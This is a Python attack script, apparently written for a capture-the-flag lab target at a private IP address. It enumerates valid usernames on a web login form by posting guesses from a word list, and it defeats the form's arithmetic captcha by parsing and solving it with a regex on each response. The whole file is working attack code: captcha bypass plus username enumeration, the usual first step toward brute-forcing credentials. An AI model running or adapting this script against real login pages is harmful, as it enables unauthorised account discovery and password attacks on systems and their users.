import requests
import sys
import re


def calculate(operator, operand1, operand2):
    if operator == "+":
        return operand1 + operand2
    elif operator == "-":
        return operand1 - operand2
    elif operator == "*":
        return operand1 * operand2
    elif operator == "/":
        return operand1 / operand2
    else:
        return None


def find_captcha(response_text):
    pattern_captcha = r"\d+\s*[+\-*/]+\s*\d+\s*=\s*\?"
    try:
        captcha = re.search(pattern_captcha, response_text).group()[:-4].split()
        result_captcha = str(calculate(captcha[1], int(captcha[0]), int(captcha[2])))
        return result_captcha
    except:
        print(f"Captcha not found.")
        return None


def find_username(response_text):
    pattern_user = r"does not exist"
    try:
        re.search(pattern_user, response_text).group()[:-4].split()
        return False
    except:
        return True


def check_usernames(url, usernames):
    with requests.session() as s:
        r = s.post(url, data={"username": "admin", "password": "admin"})
        result_captcha = find_captcha(r.text)

        for username in usernames:
            payload = {
                "username": username,
                "password": "admin",
                "captcha": result_captcha,
            }
            r = s.post(url, data=payload)
            result_captcha = find_captcha(r.text)
            if find_username(r.text):
                print(f"USER: {username}")
                sys.exit(1)
            else:
                print(f"Username {username} not found.")


if __name__ == "__main__":
    usernames = []
    with open("usernames.txt", "r") as f:
        for username in f.readlines():
            usernames.append(username.strip())

    url = "http://10.10.193.139/login" #change!
    check_usernames(url, usernames)
